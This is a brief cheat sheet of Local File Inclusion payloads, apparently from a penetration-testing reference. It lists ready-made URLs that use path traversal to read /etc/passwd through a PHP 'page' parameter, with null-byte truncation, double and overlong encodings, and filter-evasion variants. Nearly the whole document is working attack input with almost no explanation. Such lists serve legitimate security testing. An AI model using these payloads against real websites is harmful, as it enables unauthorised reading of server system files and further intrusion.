# LFI

```
http://example.com/index.php?page=../../../etc/passwd
```

### **Null byte (%00)**

Bypass the append more chars at the end of the provided string (bypass of: $\_GET\['param']."php")

```
http://example.com/index.php?page=../../../etc/passwd%00
```

This is **solved since PHP 5.4**

### **Encoding**

```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```

### **Filter bypass tricks**

```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
```
